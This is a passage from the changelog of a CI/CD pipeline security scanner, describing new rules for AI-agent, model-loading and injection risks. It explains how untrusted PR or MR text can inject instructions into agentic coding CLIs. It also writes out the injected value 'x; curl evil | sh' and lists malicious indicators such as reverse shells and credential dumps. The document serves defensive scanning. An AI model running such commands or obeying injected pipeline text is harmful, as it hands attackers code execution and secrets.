  **MODEL-002** (base model pulled straight from a third-party hub,
  `hf.co` / `huggingface.co`, bypassing the curated Ollama library),
  **MODEL-003** (base model loaded from a local unverified weights blob,
  with a `.bin` / `.pt` import flagged as pickle-backed), and **MODEL-004**
  (a LoRA `ADAPTER` applied from a remote source that can re-steer the
  model's behavior). Auto-detected on a `Modelfile` at the scan root;
  mapped across OWASP / ESF / NIST SSDF / NIST 800-53 / NIST CSF 2.0 /
  NIST 800-190 / SOC 2 / PCI DSS / SLSA / S2C2F / OSC&R / CIS supply-chain
  / OpenSSF Scorecard. Provider count 34 -> 35.
- **GL-049: agentic CLI output lands without human review (GitLab).** The
  GitLab analog of GHA-123 and the flow-control leg of the GitLab AI/model
  pack (GL-045..049), completing parity with the GitHub agentic-AI rules.
  Fires when one job both invokes an agentic CLI (`claude` / `gemini` /
  `cursor-agent` / `aider` / `openhands` / `goose` / `q chat`) and, in the
  same job, lands the result with no review gate: a `glab mr merge` with an
  auto / non-interactive flag (`--auto-merge` / `--yes` / `-y` /
  `--when-pipeline-succeeds`), a `git push` carrying the
  `merge_request.merge_when_pipeline_succeeds` push option, or a plain
  `git push` (the GitLab idiom for committing straight to a branch). Does
  not fire when the agent only opens an MR for review (`glab mr create`),
  on a push job with no agent, or on a `git push --dry-run`. The landing
  idioms are GitLab-specific so the detection is its own; the agentic-CLI
  catalog reuses the shared `_primitives/agentic_cli` helper. HIGH. gitlab
  50 -> 51.
- **GL-048: untrusted MR/commit context reaches an agentic AI CLI
  (GitLab).** The GitLab analog of GHA-119 and the AI face of GL-002
  (script injection). Fires when a job `script` line invokes an agentic
  CLI (`claude` / `gemini` / `cursor-agent` / `aider` / `openhands` /
  `goose` / `q chat`) and attacker-controllable GitLab context reaches
  that line, either a predefined untrusted variable interpolated directly
  (`$CI_MERGE_REQUEST_TITLE`, `$CI_COMMIT_MESSAGE`) or a `variables:`
  entry whose value carries one. Unlike a shell, an LLM ingests a quoted
  or variable-routed value as prompt text, so the GL-002 mitigation
  (route through a quoted variable) does not sanitize it, which is why
  this is a separate rule: anyone who can open an MR can smuggle
  instructions the agent then executes. The agentic-CLI catalog now lives
  in a shared `_primitives/agentic_cli` helper (re-exported from the
  GitHub `_helpers` so GHA-058/119/123 are unchanged). HIGH. gitlab
  49 -> 50.
- **GL-047: unsafe deserialization of a fetched artifact (GitLab).** The
  GitLab analog of GHA-122 and the deserialization leg of the GitLab
  AI/model pack (alongside GL-045 `trust_remote_code` and GL-046 unpinned
  model ref). Loading a downloaded model / artifact through a
  pickle-backed deserializer runs arbitrary Python embedded in the file
  at load time, which in CI is remote code execution under the job's
  `CI_JOB_TOKEN` and secrets. Fires per job in two shapes: an explicit
  unsafe opt-in (`weights_only=False`, or `allow_pickle=True` on
  `numpy.load`) always; or a remote fetch (`curl` / `wget` /
  `hf_hub_download` / `snapshot_download` / `huggingface-cli download` /
  `requests`) alongside a pickle-backed loader (`torch.load` /
  `pickle.load(s)` / `joblib.load`) with no safe path (`weights_only=True`
  or safetensors) in the same job. Does not fire on the safe path or a
  bare local load with no fetch. The two-shape detection now lives in a
  shared `_primitives/unsafe_deser` helper that GHA-122 and GL-047 both
  call. HIGH. gitlab 48 -> 49.
- **GL-046: AI model pulled without a pinned revision (GitLab).** The
  GitLab analog of GHA-121 and the pinning leg GL-045's own
  recommendation points to. Fires on a job's `script` /
  `before_script` / `after_script` that fetches a model from a registry
  by a *mutable* reference (`from_pretrained("org/model")`,
  `hf_hub_download` / `snapshot_download` with a bare `repo_id`, or
  `huggingface-cli download org/model`) and supplies no `revision` pin.
  Without a pinned revision the registry serves whatever the default
  branch points at, so the owner (or whoever compromises the account or
  upstream) can swap the weights, the tokenizer, or the custom loader
  code under a green build. Scoped to org-namespaced ids (`org/model`),
  so canonical first-party hub names (`bert-base-uncased`), local paths,
  and `$`-interpolations don't fire. The registry-fetch + unpinned-ref
  detection now lives in a shared `_primitives/model_ref` helper that
  GHA-121 and GL-046 both call. MEDIUM.
- **GL-045: ML model loaded with `trust_remote_code` (GitLab).** The
  GitLab analog of GHA-120, extending the AI/model-supply-chain coverage
  to the #2 CI platform. Fires on `trust_remote_code=True` /
  `--trust-remote-code` in a job's `script` / `before_script` /
  `after_script`: the transformers / huggingface_hub loader executes the
  model repo's own Python at load time, so an untrusted or unpinned model
  is arbitrary code execution in CI with the job's `CI_JOB_TOKEN` and
  secrets. HIGH.
- **Built-in policy packs (`--policy <name>`).** Five curated scan
  profiles ship with the tool so the common compliance / release gates
  work by name without authoring a file: `pr-gate` (full pack, fail on
  HIGH+), `release-gate` (fail on MEDIUM+, require grade B+), `slsa-l3`
  (SLSA + OWASP focus), `pci-dss` (PCI DSS v4.0 evidence run), and
  `supply-chain-strict` (pinning / provenance / dependency integrity,
  with the unpinned-action rule `GHA-001` promoted to CRITICAL). A local
  `./policies/<name>.yml` of the same name shadows the built-in, and
  `--list-policies` now lists the built-ins alongside any local files.
  The packs reuse the existing policy schema and precedence (CLI flags,
  env vars, and the config file still override policy values).
- **GHA-123: Agentic CLI output lands without human review.** The
  flow-control leg of the AI/LLM-pipeline pack. Fires when one job both
  invokes an agentic coding CLI (claude / gemini / cursor-agent / aider /
  openhands / goose / `q chat`) and, in the same job, lands the result
  with no review gate: `stefanzweifel/git-auto-commit-action`,
  `ad-m/github-push-action`, `peter-evans/enable-pull-request-automerge`,
  or `gh pr merge` with `--auto` / `--admin` / `--merge` / `--squash` /
  `--rebase`. AI-authored changes then reach a branch (or merge) with no
  human reviewing the diff, and if the agent's prompt is influenced by
  untrusted input that is prompt-injection straight to committed code.
  Does not fire when the agent only opens a PR for review (a bare
  `create-pull-request`), nor on an auto-commit job that runs no agent.
  HIGH.
- **GHA-122: Unsafe deserialization of a fetched artifact (pickle RCE).**
  The deserialization leg of the AI/LLM-pipeline pack. Loading a model /
  artifact through a pickle-backed deserializer executes arbitrary Python
  embedded in the file at load time, and in CI that file is routinely
  downloaded. Two firing shapes, both per `run:` step: an explicit unsafe
  opt-in (`weights_only=False`, or `allow_pickle=True` on `numpy.load`),
  always; or a remote fetch (`curl` / `wget` / `hf_hub_download` /
  `snapshot_download` / `huggingface-cli download` / `requests`) alongside
  a pickle-backed loader (`torch.load` / `pickle.load(s)` / `joblib.load`)
  with no safe path (`weights_only=True` or safetensors) in the same step.
  Does not fire on a bare local load (no fetch) or the safe path. Pairs
  with GHA-120 (`trust_remote_code`) and GHA-121 (unpinned model ref).
  HIGH.
- **GHA-121: AI model pulled without a pinned revision.** Extends the
  AI/LLM-pipeline pack (GHA-119/120) with the supply-chain pinning leg.
  Fires on a `run:` step that fetches a model from a registry by a
  *mutable* reference (`from_pretrained("org/model")`, `hf_hub_download`
  / `snapshot_download` with a bare `repo_id`, or `huggingface-cli
  download org/model`) and supplies no `revision` pin. Without a pinned
  revision the registry serves whatever the default branch points at, so
  the owner (or whoever compromises the account / upstream) can swap the
  weights, tokenizer, or custom loader code under a green build. It is
  the model-registry analog of pinning an action to a SHA (GHA-001) and
  the prerequisite for the `trust_remote_code` execution path GHA-120
  flags. Scoped to org-namespaced ids (`org/model`), so canonical
  first-party hub names (`bert-base-uncased`), local paths, and `${{ }}`
  interpolations don't fire. MEDIUM.

### Changed

- **`--verify-secrets` now covers developer-environment configs.** A
  credential committed in a `devenv` config (DEV-008, e.g. a token in an
  MCP server's `env` block or a devcontainer `remoteEnv`) is now
  live-verifiable: the doc-map the verifier re-extracts raw tokens from
  understands the devenv `WorkspaceFile`'s parsed `data` (it previously
  only handled the workflow / pipeline / Jenkinsfile contexts), and
  DEV-008 joined the secret-verification check set. A verified-active
  committed token promotes to CRITICAL with its resolved identity; a
  revoked one demotes to LOW.
- **`--help` now leads with a "Getting started" block.** The top of
  `--help` lists the five commands a new user actually reaches for
  (auto-detect scan, `init`, `--policy pr-gate`, `explain`, `--man
  recipes`) before the grouped flag reference, so the 150-flag surface
  has a map. The README Quick Start surfaces the same PR-gate one-liner
  and `--man recipes` pointer, and notes that both `pipeline-check` and
  `pipeline_check` work.
- **`--help` flag grouping cleanup.** The flags that fell into the
  catch-all `Other` bucket are now sorted into their proper sections
  (`--pipelines` / `--gitea-path` / the `--scm-*` and token flags /
  `--no-cache` → Target, `--show-passed` / `--no-group` /
  `--inline-explain` → Output, `--only-known-attacked` /
  `--verify-secrets` → Filtering, the `--chains-require-*` flags →
  Attack chains, `--serve` → Info & Help), so `--help` no longer shows
  an `Other` section at all.
- **Scan-time errors no longer dump a full traceback by default.** A
  runtime failure prints the one-line `[error] Scan failed: ...` summary
  plus a nudge to re-run with `--verbose`; the full stack trace is shown
  only under `--verbose`.

### Fixed

- **A missing or invalid required flag now exits cleanly instead of
  printing a Python traceback.** A provider's `build_context()` runs
  during scanner construction, which sat outside the run-time error
  guard, so `--pipeline scm` / `--pipeline runs` (missing `--scm-platform`
  / `--scm-repo`) and the live-cloud SDK providers (`gcp` /
  `azure_cloud`) without their optional extra installed crashed with a
  raw traceback at exit 1. The construction is now guarded: the
  provider's own message is surfaced as a clean `Error: ...` at exit 2.
- **A bad AWS profile is now a clean error, not a botocore traceback.**
  `--profile <typo>` (or an `AWS_PROFILE` env value) that doesn't exist
  raised a raw `botocore` `ProfileNotFound` stack trace; the AWS provider
  now catches it and re-raises a named, actionable `ValueError` that the
  construction guard maps to a clean exit 2.
- **`--man` accuracy.** The `output` topic now lists the `cyclonedx`,
  `spdx`, and `codequality` formats it was missing, and the `secrets`
  topic lists the Drone `DR-004` literal-secret rule.

## [1.12.0] - 2026-06-08

### Added

- **AI / LLM-pipeline rule pack (GitHub).** Two rules for the
  fastest-growing CI surface, extending the agentic-CLI family
  (GHA-058/103/104/106/111). **GHA-119** (HIGH) is the AI analog of
  GHA-003: untrusted context (a PR / issue / comment body, a fork branch
  name) reaches an agentic CLI's prompt (claude / gemini / cursor-agent /
  aider / openhands / goose), so a fork PR can smuggle instructions the
  agent then executes. Crucially it fires even when the value is routed
  through `env:`, because, unlike a shell, an LLM ingests the env value
  as prompt text, so the GHA-003 mitigation does not apply. **GHA-120**
  (HIGH) flags `trust_remote_code=True` / `--trust-remote-code` in a
  `run:` step: the transformers / huggingface_hub loader executes the
  model repo's own Python at load time, so an untrusted or unpinned model
  is arbitrary code execution in CI. The agentic-CLI catalog is now a
  shared helper (`AGENTIC_CLI_RE`) used by GHA-058 and GHA-119.
- **Run-history forensics provider (`--pipeline runs`).** A new live-API
  provider that audits what a repository's GitHub Actions *actually
  executed*, complementing the static `github` provider's "what could
  run" analysis. It pulls recent runs via the Actions REST API
  (`GET /repos/{owner}/{repo}/actions/runs`, reusing the SCM fetcher, so
  `--gh-token` / `$GITHUB_TOKEN` authenticate it and `--scm-fixture-dir`
  drives offline tests) and flags: **RUN-001** (HIGH) a fork PR that
  executed on a privileged trigger (`pull_request_target` /
  `workflow_run`) — untrusted code that ran with the base repo's secrets,
  the live shape of the tj-actions/changed-files (CVE-2025-30066) and
  GhostAction incidents; **RUN-002** (MEDIUM) privileged triggers
  exercised in the run history (the surface is live in production); and,
  with the opt-in `--audit-runs-logs` flag, **RUN-003** (HIGH) a secret
  that leaked into a run's logs (it downloads each privileged-trigger
  run's log archive and scans it with the shared secret-shape catalog;
  GitHub masks registered secrets, so a hit is a credential that leaked
  past masking). A missing token / 404 / network error degrades to a
  warning rather than crashing. Usage:
  `pipeline_check --pipeline runs --scm-repo owner/name [--audit-runs-logs]`.
- **GCB-027: Cloud Build config contains indicators of malicious activity
  (CRITICAL).** Flags specific compromise evidence (reverse shells,
  base64-decoded execution, miner binaries, Discord/Telegram webhooks,
  credential-dump pipes, audit-erasure commands) in a `cloudbuild.yaml`. The
  Google Cloud Build analog of GHA-027 / GL-025 / BB-025 / ADO-026 / CC-026,
  reusing the shared `_malicious` indicator catalog and `yaml_blob_check`.
  Defaults to LOW confidence; matches inside `example` / `fixture` / `sample`
  / `demo` / `test` keys are auto-suppressed. cloudbuild 26 -> 27.
- **DR-017: dangerous shell idiom in a Drone step command (HIGH).** Flags
  `eval "$VAR"` / `sh -c "$VAR"` / backtick exec in a step's `commands:`,
  completing the dangerous-shell-idiom family across every CI provider
  (GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / BK-016). Reuses the shared
  `shell_eval` primitive and scans each `commands:` entry on container-flavored
  pipelines; the `eval "$(ssh-agent -s)"` literal-bootstrap form stays out of
  scope. drone 16 -> 17.
- **BK-016: dangerous shell idiom in a Buildkite step command (HIGH).** Flags
  `eval "$VAR"` / `sh -c "$VAR"` / backtick exec in a step `command:`, the
  Buildkite analog of GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 (the one
  CI provider that still lacked it). Fires on the intrinsically risky idiom
  regardless of whether the value's source is currently trusted, because the
  idiom hands the value full shell-grammar reach. Reuses the shared
  `shell_eval` primitive; the `eval "$(ssh-agent -s)"` literal-bootstrap form
  is intentionally not flagged. buildkite 16 -> 17.
- **ADO-033: IaC apply on a PR-validated pipeline (CRITICAL).** Flags an IaC
  apply command (`terraform apply` / `cloudformation deploy` / `cdk deploy` /
  `pulumi up` / `sam deploy` / `terragrunt apply`) in a `script:` / `bash:` /
  `pwsh:` / `powershell:` step (or a task's `inputs.script`) on an Azure
  DevOps pipeline that opts into PR validation (`pr:` set to anything but
  `none` / `false`). The PR branch's IaC runs at apply time, so an `external`
  data source or a `local-exec` provisioner executes arbitrary code on the
  agent with the service-connection credentials before the change is reviewed.
  The Azure DevOps analog of GHA-117 / GL-041 / BB-033, reusing the shared
  `IAC_APPLY_RE` primitive and the `pr:` heuristic from ADO-011 / ADO-019.
  azure 32 -> 33.
- **JF-036: shell step interpolates a build parameter (`params.*`) (HIGH).**
  Flags a `${params.X}` spliced into a double-quoted `sh` / `bat` /
  `powershell` body. A Jenkins build parameter is set by whoever queues the
  run (anyone with Build permission, an upstream `build job:` passing
  `parameters:`, or a webhook trigger); a `string` parameter is free-form
  text that Groovy substitutes into the command before the shell parses it,
  so `params.X = "x; curl evil | sh"` runs on the agent in the build's
  credential context. The Jenkins peer of the GHA `${{ inputs.X }}` and ADO
  `${{ parameters.X }}` injection rules. Single-quoted Groovy bodies (which
  don't interpolate) are not flagged. Distinct from JF-002 (SCM env vars),
  JF-032 (agent labels), and JF-033 (`withCredentials` secret leak); the
  shared `params.*` taint pattern is now factored into `PARAMS_TAINT_RE`.
  jenkins 35 -> 36.
- **BB-033: IaC apply on a pull-request pipeline (CRITICAL).** Flags a
  `terraform apply` / `cloudformation deploy` / `cdk deploy` / `pulumi up` /
  `sam deploy` in a step under Bitbucket's `pull-requests:` section, where
  it executes the PR branch's IaC (an `external` data source or `local-exec`
  provisioner runs arbitrary code on the runner with the job's cloud
  credentials before review). The Bitbucket analog of GL-041 / GHA-117;
  steps under `branches:` / `default:` / `custom:` are out of scope.
- **BB-034: production deployment on a pull-request pipeline (CRITICAL).**
  Flags a step under Bitbucket's `pull-requests:` section bound to a
  production-tier `deployment:` environment (a name matching `production` /
  `prod`). The PR branch's code ships to production before it is reviewed or
  merged, and the production deployment's scoped variables are exposed to
  PR-controlled pipeline steps. Per-PR preview, `test`, and `staging`
  environments don't fire (only the production tier), and steps under
  `branches:` / `default:` / `custom:` / `tags:` are out of scope. The
  deploy-time sibling of BB-033. New shared `PROD_ENV_RE` primitive in
  `_primitives/deploy_names.py`.
- **GL-044: automatic production deployment on a merge-request pipeline
  (CRITICAL).** Flags a GitLab job reachable on a merge-request pipeline
  (its `rules:` admit `merge_request_event`, its legacy `only:` includes
  `merge_requests`, or it inherits a `workflow:` that admits MR pipelines)
  that binds a production-tier `environment:` (a name matching `production`
  / `prod`) and is *not* gated by `when: manual`. GL-004 treats any
  `environment:` as sufficient gating, so it misses an automatic production
  deploy on an MR; GL-044 names that shape and raises it to CRITICAL. The
  GitLab analog of BB-034. Review-app / `test` / `staging` environments and
  manual-approval jobs don't fire, and an `environment:` `action:` of
  `stop` / `prepare` / `verify` / `access` (no deploy) is excluded.
- **GL-043: GitLab native security scanner explicitly disabled (MEDIUM).**
  Flags a `*_DISABLED` CI/CD variable (`SAST_DISABLED`,
  `SECRET_DETECTION_DISABLED`, `DEPENDENCY_SCANNING_DISABLED`,
  `CONTAINER_SCANNING_DISABLED`, `DAST_DISABLED`) set to a truthy value at
  the top level or on a job, which silently drops a GitLab-managed security
  control the rest of the pipeline assumes is running. Reads both the plain
  scalar and the typed `{value:, description:}` variable form.
- **Pipeline-graph node icons (DAG v2).** The step-level pipeline graph in
  the HTML report now marks each node that a taint-engine finding
  (`TAINT-*`) lands on with a flame icon (an active dataflow path reaches
  it), and each step that attaches a build attestation
  (`actions/attest-*`, the SLSA generator, or `cosign attest`) with a chain
  icon. Both are surfaced in the node tooltip and the graph legend. Closes
  the last sub-features of the DAG v2 (#165) roadmap item.

- **SBOM dependency extraction for Maven, NuGet, and Helm.** Both SBOM
  outputs (`--output cyclonedx` and the new `--output spdx`) now include
  Maven, NuGet, and Helm-chart build dependencies, not just GitHub Actions /
  Dockerfile / npm / PyPI. The Maven provider emits each resolved
  `<dependency>` (group:artifact@version, with `${prop}` substitution,
  skipping `<dependencyManagement>` and version-less entries) as a
  `pkg:maven/...` component; the NuGet provider emits each
  `PackageReference` as a `pkg:nuget/...` component; the Helm provider emits
  each `Chart.yaml` dependency as a `pkg:helm/name@version` component, with
  a `?repository_url=` qualifier for HTTP / OCI chart repos. The GitLab
  provider emits each `image:` / `services:` reference (top-level default
  and per-job) as a `pkg:docker/...` container component, the runner images
  a pipeline executes in, the GitLab parallel of the GitHub Actions
  docker-step extraction. Version ranges, `LATEST` / `RELEASE`,
  `-SNAPSHOT`, SemVer ranges, and mutable image tags are marked unpinned.
  Closes most of the SBOM extractors deferred from v1.5.0.
- **SPDX 2.3 SBOM output (`--output spdx`).** The SPDX-format parallel of
  the existing `--output cyclonedx` SBOM, for toolchains and procurement
  flows that require SPDX rather than CycloneDX. Emits the same build-time
  dependency inventory (`scanner.sbom()`) as an SPDX 2.3 JSON document: each
  dependency is an SPDX `package` with a `purl` `externalRef`, a digest (when
  known) as a `checksums` entry, and the provider / kind / source / pinned
  metadata in the package `comment`; the document `DESCRIBES` every package
  via a relationship. No new dependency, the JSON is emitted directly.
  Closes the SPDX format deferred from v1.5.0's build-time SBOM work.

- **TKN-016: remote resolver / bundle taskRef or pipelineRef not pinned
  (HIGH).** Tekton's Resolution framework fetches the *body* of a Task or
  Pipeline at run time from a remote source. TKN-001 pins the container
  image a step runs, but a mutable resolver ref lets whoever controls the
  upstream swap the executed task body itself. TKN-016 flags a `git`
  resolver whose `revision` is not a full commit SHA, a `bundles` resolver
  (or the legacy `taskRef.bundle`) image without an `@sha256:` digest, and
  a `hub` resolver pinned to `latest` (or no version), across Pipeline
  `spec.tasks` / `spec.finally`, `PipelineRun.spec.pipelineRef`, and
  `TaskRun.spec.taskRef`. The `cluster` resolver is not flagged (it
  references an already-admitted in-cluster object). Mapped across all
  standards mirroring TKN-001's pinning controls. tekton 16 -> 17.

- **HTML report: step-level pipeline graph for Buildkite (DAG v2).**
  Extends the step-level DAG to Buildkite pipeline files
  (`.buildkite/pipeline.yml`). Each command step is a node; `depends_on`
  (by step `key`) becomes a `needs` edge, and `wait` / `block` / `input`
  barriers become `stage` edges from every step in the previous wait-group
  (so the parallel siblings between two barriers carry no false ordering
  between themselves). `group:` steps flatten their children into the
  current wait-group, and `trigger:` steps are skipped. A new
  `checks/buildkite/_graph.py` builder with no contract change, so every
  other reporter and provider is unchanged.
- **HTML report: step-level pipeline graph for Azure DevOps (DAG v2).**
  Extends the step-level DAG to Azure Pipelines (`azure-pipelines.yml`)
  across all three shapes (flat `steps:`, flat `jobs:`, and
  `stages:` → `jobs:` → `steps:`). Jobs are nodes with their steps nested
  (deployment-strategy phases flattened); job `dependsOn` (resolved within
  its stage) becomes a `needs` edge, and stages sequence via `stage`
  edges, an explicit stage `dependsOn` when present, otherwise the
  immediately preceding stage, into each stage's entry jobs (`dependsOn:
  []` opts out). A new `checks/azure/_graph.py` builder with no contract
  change.
- **HTML report: step-level pipeline graph for Bitbucket Pipelines (DAG
  v2).** Extends the step-level DAG to `bitbucket-pipelines.yml`. Bitbucket
  ordering is positional (no `depends_on`): sequential steps chain via
  `stage` edges, a `parallel` block runs its steps concurrently (no edge
  between siblings, but the next step waits for all of them), and a
  `stage`'s steps run in sequence. Every pipeline definition in the file
  (`default` plus the `branches` / `pull-requests` / `custom` / `tags`
  maps) renders as an independent chain in one graph, so a line-less
  finding badges a single file root instead of double-counting onto each
  definition. A new `checks/bitbucket/_graph.py` builder with no contract
  change.
- **HTML report: step-level pipeline graph for Jenkins (DAG v2).** Extends
  the step-level DAG to Jenkinsfiles. Jenkins is Groovy, not YAML, so the
  builder recovers each `stage('Name') { ... }` block's range from the
  same depth-aware brace walk the provider already uses, then graphs the
  top-level stages (a stage not contained in another stage's body) chained
  sequentially with `stage` edges. Nested stages (the branches of a
  `parallel { }` block, declarative sub-stages) fold into their enclosing
  top-level stage rather than inventing edges the flat stage list can't
  justify. A new `checks/jenkins/_graph.py` builder with no contract
  change. This completes the DAG-v2 rollout for every YAML/Groovy
  pipeline provider.
- **HTML report: step-level pipeline graph for Tekton (DAG v2).** Renders
  one graph per `Pipeline` document (tasks as nodes, `runAfter` plus
  implicit `$(tasks.X.results.Y)` data dependencies as `needs` edges) and
  one per `Task` / `ClusterTask` (steps chained sequentially), bounding
  each graph's root to its document's line range like the Drone builder.
  A new `checks/tekton/_graph.py` builder with no contract change.
- **HTML report: step-level pipeline graph for Argo Workflows (DAG v2).**
  Renders one graph per template-bearing document (`Workflow` /
  `WorkflowTemplate` / `ClusterWorkflowTemplate` / `CronWorkflow`) whose
  nodes are the `spec.templates`; a `dag` template's `tasks[].template` and
  a `steps` template's `steps[][].template` invocations become `needs`
  edges (caller to callee), with multi-doc roots bounded like the Drone
  builder. A new `checks/argo/_graph.py` builder with no contract change.
  **This completes the DAG-v2 rollout for every pipeline provider.**

### Changed

- **New-rule contributor friction reduced (internal).** The autodetect /
  config emitted-set assertions (`test_cli.py`, `test_config.py`) now
  derive the expected check set from the live registry
  (`tests/_check_ids.registered_ids`) instead of hand-maintained
  `range(...)` enumerations, so adding a github / gitlab / bitbucket rule
  no longer has to bump those lists (and an ID gap can't silently break a
  contiguous range). The `scripts/new_rule.py` checklist was corrected
  too: OWASP mapping is flagged MANDATORY (it was wrongly "optional"), the
  required per-check real-example pair is now listed, and the
  now-auto-derived sets are noted.
- **The gate summary clarifies grade vs gate when they disagree.** A
  strong grade (A or B) sitting on top of a failing gate is the most
  confusing outcome for a first-time user: the headline reads "Grade A"
  while the build still exits non-zero. When the gate fails with a high
  grade, the stderr summary now adds a one-line note that the grade is
  an overall posture score (checks weighted by severity) while the gate
  is a separate blocking policy, so a strong grade can still fail on a
  single blocking finding. A low grade failing the gate is unsurprising,
  so the note is suppressed there.
- **`--output json` now lists failing findings only by default.** The JSON
  `findings` array previously included every passing check too (~100 per
  file), bloating the report ~50x. It now defaults to failures-only,
  matching the terminal table and SARIF. The per-severity `passed` /
  `failed` tallies still live in the `score.summary` block, so the grade and
  counts are unchanged, and the gate/baseline path (which only reads failing
  findings) is unaffected. Pass `--show-passed` to restore the full audit
  record (every check, passed and failed). SARIF stays failures-only and
  JUnit stays a complete test report, both regardless of the flag. This is a
  behavior change for JSON consumers that iterated passing findings; they
  should add `--show-passed`.
- **Autofix nudge points at the tier that will actually apply the fix.**
  The terminal "Next ->" footer always suggested `--fix --apply`, but
  bare `--fix` runs safe fixers only, so for a finding whose only fixer
  is unsafe-tier (e.g. GHA-003 script-injection) that command modified
  nothing. The hint now counts the safe-fixable findings for
  `--fix --apply`, notes the unsafe remainder (`+N via --fix unsafe`),
  and suggests `--fix unsafe --apply` outright when every available fixer
  is unsafe.
- **Best-practice / missing-control rules now default to LOW confidence.**
  The hygiene family (no timeout, no SBOM, no signing, no SLSA
  provenance, no vuln-scan step, ~55 rules across providers) is the bulk
  of the firings on a real repo, and it drowned the active-risk findings.
  These rules now demote to LOW confidence (the detection is still
  certain, LOW means low-priority, not likely-false), so the default
  scan still shows them but `--min-confidence MEDIUM` filters them out
  for a high-signal view focused on exploitable risk. An explicit
  per-rule confidence (the curated MEDIUM / LOW lists, or a
  `confidence_locked` finding) still wins. Scores / grades are unchanged
  (the scorer weights severity, not confidence).
- **More hardcoded-credential formats detected.** The shared secret-shape
  catalog (`_patterns.SECRET_DETECTORS`, used by GHA-008 and the
  cross-provider literal-secret rules) gained four modern, high-confidence
  token formats: Postman (`PMAK-`), Tailscale (`tskey-…`), Sentry auth
  tokens (`sntrys_` / `sntryu_`), and OpenAI service-account keys
  (`sk-svcacct-…`, previously only project/legacy keys matched). Each has a
  specific fixed prefix, so a credential pasted into any scanned config now
  surfaces instead of slipping through. Positive + undersized-negative
  tests and `--man` catalog descriptions added for each.

- **GHA-044 widened to container builds.** The build-tool PPE rule now
  also flags `docker build` / `docker buildx build` in a `run:` step and
  the `docker/build-push-action` action on an untrusted-trigger workflow
  (`pull_request_target` / `workflow_run`). A container build executes the
  checked-out `Dockerfile` (its `RUN` instructions) against a build context
  that may be PR-controlled, so a fork-supplied Dockerfile is a poisoned-
  pipeline-execution payload exactly like a tampered `package.json` /
  `Makefile` / `setup.py`. No new rule ID; this is the widening the roadmap
  reserved instead of a separate check.
- **Lint and prose cleanup.** Fixed a latent `zip()`-without-`strict=`
  (ruff B905) in the Jenkins pipeline-graph builder, and reworded the four
  remaining AI-tic words (`robust` / `comprehensive` / two `leverage`) in
  rule docstrings and one `known_fp` note to match the CLAUDE.md prose
  convention. The whole package is now ruff-clean and passes
  `mypy --strict` across all source files. No behavior change.
- **Single source of truth for valid severity names.** `config.py` and
  `policies.py` each hand-maintained an identical `_VALID_SEVERITIES`
  frozenset used to validate `overrides:` severities (which change a
  finding's gate severity). Both now import one `VALID_SEVERITY_NAMES` set
  derived from the canonical `Severity` enum in `checks/base.py`, so the two
  config loaders can't drift from each other or from the enum. No behavior
  change.
- **Deploy-command vocabulary centralized (and Lambda-deploy coverage
  widened).** Five deploy-gating rules (`ADO-004`, `BB-004`, `GL-004`,
  `GL-029`, `GHA-098`) each carried a private copy of the deploy-command
  regex; a new verb added to one (`GHA-098` had `aws lambda
  update-function-code`) silently didn't reach the others. They now all
  import the shared `DEPLOY_CMD_RE` from `_primitives/deploy_names.py`, and
  that catalog gained `aws lambda update-function-code`, so every
  deploy-gating rule now recognizes a Lambda code deploy as a deployment.
  The shared `PROD_ENV_RE` (production-environment name heuristic, used by
  `BB-034` / `GL-044`) was also corrected to match underscore-separated
  names (`prod_us`, `production_east`) that the previous `\b` boundary
  missed, while still excluding `product` / `preprod` / `non-prod`. New
  primitive tests pin `DEPLOY_CMD_RE` and `PROD_ENV_RE`. ~70 lines of
  duplicated regex removed. `ADO-004` and `GHA-099` likewise carried their
  own copy of the deploy-*name* regex (`GHA-099` via an inline
  `__import__("re").compile`); both now import the shared `DEPLOY_RE`, so
  the whole deploy vocabulary (name, command, IaC-apply) is single-sourced.
- **GHA-111 IaC-apply detection widened to match its siblings.** `GHA-111`
  (AI agent applies IaC in the same job) carried a private IaC-apply regex
  that had drifted to a subset of the shared `IAC_APPLY_RE` the other
  IaC-apply rules (`GHA-117`, `GL-041`, `BB-033`) use, missing OpenTofu
  (`tofu`), `terragrunt run-all`, and every `destroy` / teardown variant.
  An AI agent running `terraform destroy` or `tofu apply` against the cloud
  account is the same blast radius the rule targets, so it now imports the
  shared `IAC_APPLY_RE` and detects those forms. New primitive tests pin
  `IAC_APPLY_RE` (the full apply/destroy vocabulary, read-only `plan` /
  `diff` excluded).
- **Attack-chain narratives match the reachability badge.** When a chain's
  reachability is only shared-job co-location (not a proven dataflow path),
  its narrative now opens that leg with "Co-located (unverified): ..." to
  match the yellow "Co-located (unverified)" badge already shown in the
  terminal / Markdown / HTML reports, instead of the stronger "Reachability
  confirmed: ...". The proven-dataflow branches still read "Reachability
  confirmed by dataflow", and the structural-identity chains (a shared
  image, IAM role, ServiceAccount, or repo, not job co-location: AC-005 /
  AC-007 / AC-011 / AC-016 / AC-017 / AC-020 / AC-021 / XPC-002) keep
  "Reachability confirmed" since they aren't co-location. Prose only; chain
  emission, severity, confidence, and `confirmed_reachable` are unchanged.
- **Structural-identity reachability is now its own confirmed badge tier.**
  The eight structural-identity chains above set `confirmed_reachable=True`
  at HIGH confidence (the two legs share a build artifact / image digest /
  IAM role / ServiceAccount / repo), but the reports rendered them with the
  weak yellow `≈ Co-located (unverified)` badge, which both contradicted
  their "Reachability confirmed" narrative and was factually wrong (they
  aren't co-located in a job). They now render a green
  `✓ Reachability confirmed (structural)` badge, a third tier between the
  proven-dataflow tier and the shared-job co-location fallback. A new
  `Chain.via_structural` flag drives it and is emitted in the SARIF /
  JSON chain properties next to `via_dataflow`. Gating is unchanged:
  structural chains pass `--chains-require-reachability` (they're
  confirmed) and are dropped by `--chains-require-dataflow` (no traced
  taint path).
- **Prose-style lint enforces the AI-tic word ban.** The CLAUDE.md prose
  convention ("read like a coworker wrote it") was guidance only, so
  AI-essay tics kept creeping back into docs and rule prose (a stray
  `comprehensive` was just removed from the OSC&R standards-page intro).
  A new `tests/test_prose_style.py` (the sibling of
  `test_english_variant.py`) now fails the suite if `moreover`,
  `furthermore`, `comprehensive`, or `delve` lands in any tracked `.py`
  or `.md` file. `robust` and `leverage` are left to review rather than
  gated, because they carry real technical meanings in the codebase
  (code robustness; "leverage" as the security noun); CHANGELOG / ROADMAP
  are exempt as historical records.

### Fixed

- **Loader hardening sweep: pathological scanned inputs degrade across
  every format, not just YAML.** Extending the deeply-nested-YAML fix to
  the whole loader surface, an audit found the same `RecursionError` /
  `MemoryError` gap (the builtin slips past a parser's
